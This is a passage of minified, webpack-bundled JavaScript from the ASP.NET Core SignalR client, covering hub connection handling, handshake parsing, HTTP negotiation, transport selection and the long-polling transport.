					r(null, n ? n : new Error("Invocation canceled due to connection being closed."))
				});
				this.cleanupTimeout();
				this.cleanupPingTimer();
				this.closedCallbacks.forEach(function(t) {
					return t.apply(i, [n])
				})
			}, n.prototype.cleanupPingTimer = function() {
				this.pingServerHandle && clearTimeout(this.pingServerHandle)
			}, n.prototype.cleanupTimeout = function() {
				this.timeoutHandle && clearTimeout(this.timeoutHandle)
			}, n.prototype.createInvocation = function(n, t, i) {
				if (i) return {
					arguments: t,
					target: n,
					type: r.MessageType.Invocation
				};
				var u = this.id;
				return this.id++, {
					arguments: t,
					invocationId: u.toString(),
					target: n,
					type: r.MessageType.Invocation
				}
			}, n.prototype.createStreamInvocation = function(n, t) {
				var i = this.id;
				return this.id++, {
					arguments: t,
					invocationId: i.toString(),
					target: n,
					type: r.MessageType.StreamInvocation
				}
			}, n.prototype.createCancelInvocation = function(n) {
				return {
					invocationId: n,
					type: r.MessageType.CancelInvocation
				}
			}, n
		}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "HandshakeProtocol", function() {
			return f
		});
		var r = i(11),
			u = i(12),
			f = function() {
				function n() {}
				return n.prototype.writeHandshakeRequest = function(n) {
					return r.TextMessageFormat.write(JSON.stringify(n))
				}, n.prototype.parseHandshakeResponse = function(n) {
					var c, o, s, f, e, i, t, l, h;
					if (Object(u.isArrayBuffer)(n) || typeof Buffer != "undefined" && n instanceof Buffer) {
						if (f = new Uint8Array(n), i = f.indexOf(r.TextMessageFormat.RecordSeparatorCode), i === -1) throw new Error("Message is incomplete.");
						t = i + 1;
						o = String.fromCharCode.apply(null, f.slice(0, t));
						s = f.byteLength > t ? f.slice(t).buffer : null
					} else {
						if (e = n, i = e.indexOf(r.TextMessageFormat.RecordSeparator), i === -1) throw new Error("Message is incomplete.");
						t = i + 1;
						o = e.substring(0, t);
						s = e.length > t ? e.substring(t) : null
					}
					if (l = r.TextMessageFormat.parse(o), h = JSON.parse(l[0]), h.type) throw new Error("Expected a handshake response from the server.");
					return c = h, [s, c]
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "TextMessageFormat", function() {
			return r
		});
		var r = function() {
			function n() {}
			return n.write = function(t) {
				return "" + t + n.RecordSeparator
			}, n.parse = function(t) {
				if (t[t.length - 1] !== n.RecordSeparator) throw new Error("Message is incomplete.");
				var i = t.split(n.RecordSeparator);
				return i.pop(), i
			}, n.RecordSeparatorCode = 30, n.RecordSeparator = String.fromCharCode(n.RecordSeparatorCode), n
		}()
	}, function(n, t, i) {
		"use strict";

		function e(n, t) {
			var i = "";
			return u(n) ? (i = "Binary data of length " + n.byteLength, t && (i += ". Content: '" + o(n) + "'")) : typeof n == "string" && (i = "String data of length " + n.length, t && (i += ". Content: '" + n + "'")), i
		}

		function o(n) {
			var i = new Uint8Array(n),
				t = "";
			return i.forEach(function(n) {
				var i = n < 16 ? "0" : "";
				t += "0x" + i + n.toString(16) + " "
			}), t.substr(0, t.length - 1)
		}

		function u(n) {
			return n && typeof ArrayBuffer != "undefined" && (n instanceof ArrayBuffer || n.constructor && n.constructor.name === "ArrayBuffer")
		}

		function v(n, t, i, f, o, s, h) {
			return c(this, void 0, void 0, function() {
				var c, v, a, y, p;
				return l(this, function(l) {
					switch (l.label) {
						case 0:
							return o ? [4, o()] : [3, 2];
						case 1:
							a = l.sent();
							a && (v = (c = {}, c.Authorization = "Bearer " + a, c));
							l.label = 2;
						case 2:
							return n.log(r.LogLevel.Trace, "(" + t + " transport) sending data. " + e(s, h) + "."), y = u(s) ? "arraybuffer" : "text", [4, i.post(f, {
								content: s,
								headers: v,
								responseType: y
							})];
						case 3:
							return p = l.sent(), n.log(r.LogLevel.Trace, "(" + t + " transport) request complete. Response status: " + p.statusCode + "."), [2]
					}
				})
			})
		}

		function y(n) {
			return n === undefined ? new f(r.LogLevel.Information) : n === null ? h.NullLogger.instance : n.log ? n : new f(n)
		}
		i.r(t);
		i.d(t, "Arg", function() {
			return a
		});
		i.d(t, "getDataDetail", function() {
			return e
		});
		i.d(t, "formatArrayBuffer", function() {
			return o
		});
		i.d(t, "isArrayBuffer", function() {
			return u
		});
		i.d(t, "sendMessage", function() {
			return v
		});
		i.d(t, "createLogger", function() {
			return y
		});
		i.d(t, "Subject", function() {
			return p
		});
		i.d(t, "SubjectSubscription", function() {
			return s
		});
		i.d(t, "ConsoleLogger", function() {
			return f
		});
		var r = i(8),
			h = i(13),
			c = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			l = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			a = function() {
				function n() {}
				return n.isRequired = function(n, t) {
					if (n === null || n === undefined) throw new Error("The '" + t + "' argument is required.");
				}, n.isIn = function(n, t, i) {
					if (!(n in t)) throw new Error("Unknown " + i + " value: " + n + ".");
				}, n
			}();
		var p = function() {
				function n(n) {
					this.observers = [];
					this.cancelCallback = n
				}
				return n.prototype.next = function(n) {
					for (var r, t = 0, i = this.observers; t < i.length; t++) r = i[t], r.next(n)
				}, n.prototype.error = function(n) {
					for (var r, t = 0, i = this.observers; t < i.length; t++) r = i[t], r.error && r.error(n)
				}, n.prototype.complete = function() {
					for (var i, n = 0, t = this.observers; n < t.length; n++) i = t[n], i.complete && i.complete()
				}, n.prototype.subscribe = function(n) {
					return this.observers.push(n), new s(this, n)
				}, n
			}(),
			s = function() {
				function n(n, t) {
					this.subject = n;
					this.observer = t
				}
				return n.prototype.dispose = function() {
					var n = this.subject.observers.indexOf(this.observer);
					n > -1 && this.subject.observers.splice(n, 1);
					this.subject.observers.length === 0 && this.subject.cancelCallback().catch(function() {})
				}, n
			}(),
			f = function() {
				function n(n) {
					this.minimumLogLevel = n
				}
				return n.prototype.log = function(n, t) {
					if (n >= this.minimumLogLevel) switch (n) {
						case r.LogLevel.Critical:
						case r.LogLevel.Error:
							console.error("[" + (new Date).toISOString() + "] " + r.LogLevel[n] + ": " + t);
							break;
						case r.LogLevel.Warning:
							console.warn("[" + (new Date).toISOString() + "] " + r.LogLevel[n] + ": " + t);
							break;
						case r.LogLevel.Information:
							console.info("[" + (new Date).toISOString() + "] " + r.LogLevel[n] + ": " + t);
							break;
						default:
							console.log("[" + (new Date).toISOString() + "] " + r.LogLevel[n] + ": " + t)
					}
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "NullLogger", function() {
			return r
		});
		var r = function() {
			function n() {}
			return n.prototype.log = function() {}, n.instance = new n, n
		}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "MessageType", function() {
			return r
		});
		var r;
		(function(n) {
			n[n.Invocation = 1] = "Invocation";
			n[n.StreamItem = 2] = "StreamItem";
			n[n.Completion = 3] = "Completion";
			n[n.StreamInvocation = 4] = "StreamInvocation";
			n[n.CancelInvocation = 5] = "CancelInvocation";
			n[n.Ping = 6] = "Ping";
			n[n.Close = 7] = "Close"
		})(r || (r = {}))
	}, function(n, t, i) {
		"use strict";

		function h(n) {
			return n.log !== undefined
		}
		i.r(t);
		i.d(t, "HubConnectionBuilder", function() {
			return s
		});
		var u = i(16),
			f = i(9),
			e = i(22),
			o = i(13),
			r = i(12),
			s = function() {
				function n() {}
				return n.prototype.configureLogging = function(n) {
					return r.Arg.isRequired(n, "logging"), this.logger = h(n) ? n : new r.ConsoleLogger(n), this
				}, n.prototype.withUrl = function(n, t) {
					return r.Arg.isRequired(n, "url"), this.url = n, this.httpConnectionOptions = typeof t == "object" ? t : {
						transport: t
					}, this
				}, n.prototype.withHubProtocol = function(n) {
					return r.Arg.isRequired(n, "protocol"), this.protocol = n, this
				}, n.prototype.build = function() {
					var n = this.httpConnectionOptions || {},
						t;
					if (n.logger === undefined && (n.logger = this.logger), !this.url) throw new Error("The 'HubConnectionBuilder.withUrl' method must be called before building the connection.");
					return t = new u.HttpConnection(this.url, n), f.HubConnection.create(t, this.logger || o.NullLogger.instance, this.protocol || new e.JsonHubProtocol)
				}, n
			}()
	}, function(n, t, i) {
		"use strict";

		function b(n, t) {
			return !n || (t & n) != 0
		}
		var c, v;
		i.r(t);
		i.d(t, "HttpConnection", function() {
			return v
		});
		var y = i(6),
			u = i(8),
			r = i(17),
			l = i(18),
			p = i(20),
			o = i(12),
			w = i(21),
			e = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			f = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			a = 100,
			s = null,
			h = null;
		typeof window == "undefined" && !0 && (c = require, s = c("ws"), h = c("eventsource"));
		v = function() {
			function n(n, t) {
				t === void 0 && (t = {});
				this.features = {};
				o.Arg.isRequired(n, "url");
				this.logger = Object(o.createLogger)(t.logger);
				this.baseUrl = this.resolveUrl(n);
				t = t || {};
				t.logMessageContent = t.logMessageContent || !1;
				var i = typeof window == "undefined";
				i || typeof WebSocket == "undefined" || t.WebSocket ? i && !t.WebSocket && s && (t.WebSocket = s) : t.WebSocket = WebSocket;
				i || typeof EventSource == "undefined" || t.EventSource ? i && !t.EventSource && typeof h != "undefined" && (t.EventSource = h) : t.EventSource = EventSource;
				this.httpClient = t.httpClient || new y.DefaultHttpClient(this.logger);
				this.connectionState = 2;
				this.options = t;
				this.onreceive = null;
				this.onclose = null
			}
			return n.prototype.start = function(n) {
				return (n = n || r.TransferFormat.Binary, o.Arg.isIn(n, r.TransferFormat, "transferFormat"), this.logger.log(u.LogLevel.Debug, "Starting connection with transfer format '" + r.TransferFormat[n] + "'."), this.connectionState !== 2) ? Promise.reject(new Error("Cannot start a connection that is not in the 'Disconnected' state.")) : (this.connectionState = 0, this.startPromise = this.startInternal(n), this.startPromise)
			}, n.prototype.send = function(n) {
				if (this.connectionState !== 1) throw new Error("Cannot send data if the connection is not in the 'Connected' State.");
				return this.transport.send(n)
			}, n.prototype.stop = function(n) {
				return e(this, void 0, void 0, function() {
					var t;
					return f(this, function(i) {
						switch (i.label) {
							case 0:
								this.connectionState = 2;
								this.stopError = n;
								i.label = 1;
							case 1:
								return i.trys.push([1, 3, , 4]), [4, this.startPromise];
							case 2:
								return i.sent(), [3, 4];
							case 3:
								return t = i.sent(), [3, 4];
							case 4:
								return this.transport ? [4, this.transport.stop()] : [3, 6];
							case 5:
								i.sent();
								this.transport = undefined;
								i.label = 6;
							case 6:
								return [2]
						}
					})
				})
			}, n.prototype.startInternal = function(n) {
				return e(this, void 0, void 0, function() {
					var i, t, e, c, o, s, h, v = this;
					return f(this, function(y) {
						switch (y.label) {
							case 0:
								i = this.baseUrl;
								this.accessTokenFactory = this.options.accessTokenFactory;
								y.label = 1;
							case 1:
								return (y.trys.push([1, 12, , 13]), !this.options.skipNegotiation) ? [3, 5] : (this.options.transport === r.HttpTransportType.WebSockets) ? (this.transport = this.constructTransport(r.HttpTransportType.WebSockets), [4, this.transport.connect(i, n)]) : [3, 3];
							case 2:
								return y.sent(), [3, 4];
							case 3:
								throw Error("Negotiation can only be skipped when using the WebSocket transport directly.");
							case 4:
								return [3, 11];
							case 5:
								t = null;
								e = 0;
								c = function() {
									var n;
									return f(this, function(r) {
										switch (r.label) {
											case 0:
												return [4, o.getNegotiationResponse(i)];
											case 1:
												if (t = r.sent(), o.connectionState === 2) return [2, {
													value: void 0
												}];
												if (t.error) throw Error(t.error);
												if (t.ProtocolVersion) throw Error("Detected a connection attempt to an ASP.NET SignalR Server. This client only supports connecting to an ASP.NET Core SignalR Server. See https://aka.ms/signalr-core-differences for details.");
												return t.url && (i = t.url), t.accessToken && (n = t.accessToken, o.accessTokenFactory = function() {
													return n
												}), e++, [2]
										}
									})
								};
								o = this;
								y.label = 6;
							case 6:
								return [5, c()];
							case 7:
								if (s = y.sent(), typeof s == "object") return [2, s.value];
								y.label = 8;
							case 8:
								if (t.url && e < a) return [3, 6];
								y.label = 9;
							case 9:
								if (e === a && t.url) throw Error("Negotiate redirection limit exceeded.");
								return [4, this.createTransport(i, this.options.transport, t, n)];
							case 10:
								y.sent();
								y.label = 11;
							case 11:
								return this.transport instanceof l.LongPollingTransport && (this.features.inherentKeepAlive = !0), this.transport.onreceive = this.onreceive, this.transport.onclose = function(n) {
									return v.stopConnection(n)
								}, this.changeState(0, 1), [3, 13];
							case 12:
								h = y.sent();
								this.logger.log(u.LogLevel.Error, "Failed to start the connection: " + h);
								this.connectionState = 2;
								this.transport = undefined;
								throw h;
							case 13:
								return [2]
						}
					})
				})
			}, n.prototype.getNegotiationResponse = function(n) {
				return e(this, void 0, void 0, function() {
					var i, s, r, e, t, o;
					return f(this, function(f) {
						switch (f.label) {
							case 0:
								return this.accessTokenFactory ? [4, this.accessTokenFactory()] : [3, 2];
							case 1:
								r = f.sent();
								r && (s = (i = {}, i.Authorization = "Bearer " + r, i));
								f.label = 2;
							case 2:
								e = this.resolveNegotiateUrl(n);
								this.logger.log(u.LogLevel.Debug, "Sending negotiation request: " + e + ".");
								f.label = 3;
							case 3:
								return f.trys.push([3, 5, , 6]), [4, this.httpClient.post(e, {
									content: "",
									headers: s
								})];
							case 4:
								if (t = f.sent(), t.statusCode !== 200) throw Error("Unexpected status code returned from negotiate " + t.statusCode);
								return [2, JSON.parse(t.content)];
							case 5:
								o = f.sent();
								this.logger.log(u.LogLevel.Error, "Failed to complete negotiation with the server: " + o);
								throw o;
							case 6:
								return [2]
						}
					})
				})
			}, n.prototype.createConnectUrl = function(n, t) {
				return t ? n + (n.indexOf("?") === -1 ? "?" : "&") + ("id=" + t) : n
			}, n.prototype.createTransport = function(n, t, i, o) {
				return e(this, void 0, void 0, function() {
					var e, l, s, c, a, h, v;
					return f(this, function(f) {
						switch (f.label) {
							case 0:
								return (e = this.createConnectUrl(n, i.connectionId), !this.isITransport(t)) ? [3, 2] : (this.logger.log(u.LogLevel.Debug, "Connection was provided an instance of ITransport, using that directly."), this.transport = t, [4, this.transport.connect(e, o)]);
							case 1:
								return f.sent(), this.changeState(0, 1), [2];
							case 2:
								l = i.availableTransports || [];
								s = 0;
								c = l;
								f.label = 3;
							case 3:
								return (s < c.length) ? (a = c[s], this.connectionState = 0, h = this.resolveTransport(a, t, o), !(typeof h == "number")) ? [3, 8] : (this.transport = this.constructTransport(h), !!i.connectionId) ? [3, 5] : [4, this.getNegotiationResponse(n)] : [3, 9];
							case 4:
								i = f.sent();
								e = this.createConnectUrl(n, i.connectionId);
								f.label = 5;
							case 5:
								return f.trys.push([5, 7, , 8]), [4, this.transport.connect(e, o)];
							case 6:
								return f.sent(), this.changeState(0, 1), [2];
							case 7:
								return v = f.sent(), this.logger.log(u.LogLevel.Error, "Failed to start the transport '" + r.HttpTransportType[h] + "': " + v), this.connectionState = 2, i.connectionId = undefined, [3, 8];
							case 8:
								return s++, [3, 3];
							case 9:
								throw new Error("Unable to initialize any of the available transports.");
						}
					})
				})
			}, n.prototype.constructTransport = function(n) {
				switch (n) {
					case r.HttpTransportType.WebSockets:
						if (!this.options.WebSocket) throw new Error("'WebSocket' is not supported in your environment.");
						return new w.WebSocketTransport(this.httpClient, this.accessTokenFactory, this.logger, this.options.logMessageContent || !1, this.options.WebSocket);
					case r.HttpTransportType.ServerSentEvents:
						if (!this.options.EventSource) throw new Error("'EventSource' is not supported in your environment.");
						return new p.ServerSentEventsTransport(this.httpClient, this.accessTokenFactory, this.logger, this.options.logMessageContent || !1, this.options.EventSource);
					case r.HttpTransportType.LongPolling:
						return new l.LongPollingTransport(this.httpClient, this.accessTokenFactory, this.logger, this.options.logMessageContent || !1);
					default:
						throw new Error("Unknown transport: " + n + ".");
				}
			}, n.prototype.resolveTransport = function(n, t, i) {
				var f = r.HttpTransportType[n.transport],
					e;
				if (f === null || f === undefined) this.logger.log(u.LogLevel.Debug, "Skipping transport '" + n.transport + "' because it is not supported by this client.");
				else if (e = n.transferFormats.map(function(n) {
						return r.TransferFormat[n]
					}), b(t, f))
					if (e.indexOf(i) >= 0) {
						if ((f !== r.HttpTransportType.WebSockets || this.options.WebSocket) && (f !== r.HttpTransportType.ServerSentEvents || this.options.EventSource)) return this.logger.log(u.LogLevel.Debug, "Selecting transport '" + r.HttpTransportType[f] + "'."), f;
						this.logger.log(u.LogLevel.Debug, "Skipping transport '" + r.HttpTransportType[f] + "' because it is not supported in your environment.'")
					} else this.logger.log(u.LogLevel.Debug, "Skipping transport '" + r.HttpTransportType[f] + "' because it does not support the requested transfer format '" + r.TransferFormat[i] + "'.");
				else this.logger.log(u.LogLevel.Debug, "Skipping transport '" + r.HttpTransportType[f] + "' because it was disabled by the client.");
				return null
			}, n.prototype.isITransport = function(n) {
				return n && typeof n == "object" && "connect" in n
			}, n.prototype.changeState = function(n, t) {
				return this.connectionState === n ? (this.connectionState = t, !0) : !1
			}, n.prototype.stopConnection = function(n) {
				if (this.transport = undefined, n = this.stopError || n, n ? this.logger.log(u.LogLevel.Error, "Connection disconnected with error '" + n + "'.") : this.logger.log(u.LogLevel.Information, "Connection disconnected."), this.connectionState = 2, this.onclose) this.onclose(n)
			}, n.prototype.resolveUrl = function(n) {
				if (n.lastIndexOf("https://", 0) === 0 || n.lastIndexOf("http://", 0) === 0) return n;
				if (typeof window == "undefined" || !window || !window.document) throw new Error("Cannot resolve '" + n + "'.");
				var t = window.document.createElement("a");
				return t.href = n, this.logger.log(u.LogLevel.Information, "Normalizing '" + n + "' to '" + t.href + "'."), t.href
			}, n.prototype.resolveNegotiateUrl = function(n) {
				var i = n.indexOf("?"),
					t = n.substring(0, i === -1 ? n.length : i);
				return t[t.length - 1] !== "/" && (t += "/"), t += "negotiate", t + (i === -1 ? "" : n.substring(i))
			}, n
		}()
	}, function(n, t, i) {
		"use strict";
		var r, u;
		i.r(t);
		i.d(t, "HttpTransportType", function() {
			return r
		});
		i.d(t, "TransferFormat", function() {
				return u
			}),
			function(n) {
				n[n.None = 0] = "None";
				n[n.WebSockets = 1] = "WebSockets";
				n[n.ServerSentEvents = 2] = "ServerSentEvents";
				n[n.LongPolling = 4] = "LongPolling"
			}(r || (r = {})),
			function(n) {
				n[n.Text = 1] = "Text";
				n[n.Binary = 2] = "Binary"
			}(u || (u = {}))
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "LongPollingTransport", function() {
			return c
		});
		var h = i(19),
			o = i(4),
			r = i(8),
			s = i(17),
			u = i(12),
			f = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			e = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			c = function() {
				function n(n, t, i, r) {
					this.httpClient = n;
					this.accessTokenFactory = t;
					this.logger = i;
					this.pollAbort = new h.AbortController;
					this.logMessageContent = r;
					this.running = !1;
					this.onreceive = null;
					this.onclose = null
				}
				return Object.defineProperty(n.prototype, "pollAborted", {
					get: function() {
						return this.pollAbort.aborted
					},
					enumerable: !0,
					configurable: !0
				}), n.prototype.connect = function(n, t) {
					return f(this, void 0, void 0, function() {
						var i, c, h, f;
						return e(this, function(e) {
							switch (e.label) {
								case 0:
									if (u.Arg.isRequired(n, "url"), u.Arg.isRequired(t, "transferFormat"), u.Arg.isIn(t, s.TransferFormat, "transferFormat"), this.url = n, this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Connecting."), t === s.TransferFormat.Binary && typeof XMLHttpRequest != "undefined" && typeof(new XMLHttpRequest).responseType != "string") throw new Error("Binary protocols over XmlHttpRequest not implementing advanced features are not supported.");
									return i = {
										abortSignal: this.pollAbort.signal,
										headers: {},
										timeout: 1e5
									}, t === s.TransferFormat.Binary && (i.responseType = "arraybuffer"), [4, this.getAccessToken()];
								case 1:
									return c = e.sent(), this.updateHeaderToken(i, c), h = n + "&_=" + Date.now(), this.logger.log(r.LogLevel.Trace, "(LongPolling transport) polling: " + h + "."), [4, this.httpClient.get(h, i)];
								case 2:
									return f = e.sent(), f.statusCode !== 200 ? (this.logger.log(r.LogLevel.Error, "(LongPolling transport) Unexpected response code: " + f.statusCode + "."), this.closeError = new o.HttpError(f.statusText || "", f.statusCode), this.running = !1) : this.running = !0, this.receiving = this.poll(this.url, i), [2]
							}
						})
					})
				}, n.prototype.getAccessToken = function() {
					return f(this, void 0, void 0, function() {
						return e(this, function(n) {
							switch (n.label) {
								case 0:
									return this.accessTokenFactory ? [4, this.accessTokenFactory()] : [3, 2];
								case 1:
									return [2, n.sent()];
								case 2:
									return [2, null]
							}
						})
					})
				}, n.prototype.updateHeaderToken = function(n, t) {
					if (n.headers || (n.headers = {}), t) {
						n.headers.Authorization = "Bearer " + t;
						return
					}
					n.headers.Authorization && delete n.headers.Authorization
				}, n.prototype.poll = function(n, t) {
					return f(this, void 0, void 0, function() {
						var h, s, i, f;
						return e(this, function(e) {
							switch (e.label) {
								case 0:
									e.trys.push([0, , 8, 9]);
									e.label = 1;
								case 1:
									return this.running ? [4, this.getAccessToken()] : [3, 7];
								case 2:
									h = e.sent();
									this.updateHeaderToken(t, h);
									e.label = 3;
								case 3:
									return e.trys.push([3, 5, , 6]), s = n + "&_=" + Date.now(), this.logger.log(r.LogLevel.Trace, "(LongPolling transport) polling: " + s + "."), [4, this.httpClient.get(s, t)];
								case 4:
									if (i = e.sent(), i.statusCode === 204) this.logger.log(r.LogLevel.Information, "(LongPolling transport) Poll terminated by server."), this.running = !1;
									else if (i.statusCode !== 200) this.logger.log(r.LogLevel.Error, "(LongPolling transport) Unexpected response code: " + i.statusCode + "."), this.closeError = new o.HttpError(i.statusText || "", i.statusCode), this.running = !1;
									else if (i.content) {
										if (this.logger.log(r.LogLevel.Trace, "(LongPolling transport) data received. " + Object(u.getDataDetail)(i.content, this.logMessageContent) + "."), this.onreceive) this.onreceive(i.content)
									} else this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Poll timed out, reissuing.");
									return [3, 6];
								case 5:
									return f = e.sent(), this.running ? f instanceof o.TimeoutError ? this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Poll timed out, reissuing.") : (this.closeError = f, this.running = !1) : this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Poll errored after shutdown: " + f.message), [3, 6];
								case 6:
									return [3, 1];
								case 7:
									return [3, 9];
								case 8:
									return this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Polling complete."), this.pollAborted || this.raiseOnClose(), [7];
								case 9:
									return [2]
							}
						})
					})
				}, n.prototype.send = function(n) {
					return f(this, void 0, void 0, function() {
						return e(this, function() {
							return this.running ? [2, Object(u.sendMessage)(this.logger, "LongPolling", this.httpClient, this.url, this.accessTokenFactory, n, this.logMessageContent)] : [2, Promise.reject(new Error("Cannot send until the transport is connected"))]
						})
					})
				}, n.prototype.stop = function() {
					return f(this, void 0, void 0, function() {
						var n, t;
						return e(this, function(i) {
							switch (i.label) {
								case 0:
									this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Stopping polling.");
									this.running = !1;
									this.pollAbort.abort();
									i.label = 1;
								case 1:
									return i.trys.push([1, , 5, 6]), [4, this.receiving];
								case 2:
									return i.sent(), this.logger.log(r.LogLevel.Trace, "(LongPolling transport) sending DELETE request to " + this.url + "."), n = {
										headers: {}
									}, [4, this.getAccessToken()];
								case 3:
									return t = i.sent(), this.updateHeaderToken(n, t), [4, this.httpClient.delete(this.url, n)];
								case 4:
									return i.sent(), this.logger.log(r.LogLevel.Trace, "(LongPolling transport) DELETE request sent."), [3, 6];
								case 5:
									return this.logger.log(r.LogLevel.Trace, "(LongPolling transport) Stop finished."), this.raiseOnClose(), [7];
								case 6:
									return [2]
							}
						})
					})
				}, n.prototype.raiseOnClose = function() {
					if (this.onclose) {
						var n = "(LongPolling transport) Firing onclose event.";
						this.closeError && (n += " Error: " + this.closeError);
						this.logger.log(r.LogLevel.Trace, n);
						this.onclose(this.closeError)
					}
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "AbortController", function() {
			return r
		});
		var r = function() {
			function n() {
				this.isAborted = !1;
				this.onabort = null
			}
			return n.prototype.abort = function() {
